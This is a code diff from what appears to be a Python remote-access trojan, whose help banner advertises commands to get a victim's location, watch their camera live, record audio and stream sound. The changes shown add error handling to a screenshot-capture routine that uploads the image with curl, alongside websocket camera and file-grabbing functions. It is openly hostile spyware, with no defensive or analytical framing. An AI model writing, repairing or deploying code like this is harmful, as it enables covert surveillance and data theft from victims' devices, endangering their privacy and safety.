@@ -39,7 +39,6 @@ banner = r"""
    ` (|           |) `
      \)           (/
 
-======================[ HELP ]=======================
 ~COMMANDS
  -location: This command gets location victim.
  -start-camera-live: Watch victim.
@@ -51,7 +50,6 @@ banner = r"""
  -help: display help screen. 
  -record time: record audio from victim's device.
  -stream-sound: Listing to victim realtime.
-=====================================================
 """
 async def open_camera():
     async with websockets.connect(WEBSOCKET_URL) as ws:
@@ -109,8 +107,13 @@ def get_files(args):
         return True
     except:
         return False
+
 def get_screenshot():
-    screenshot = ImageGrab.grab()
+    try:
+        screenshot = ImageGrab.grab()
+    except Exception as e:
+        print("Screenshot error:", e)
+        return False
     buf = io.BytesIO()
     screenshot.save(buf, format="PNG")
     buf.seek(0)
@@ -127,9 +130,11 @@ def get_screenshot():
             capture_output=True
         )
         if result.returncode != 0:
+            print("Curl error:", result.stderr.decode())
             return False
         return True
-    except:
+    except Exception as e:
+        print("Curl exception:", e)
         return False
 def get_location():
     location = None
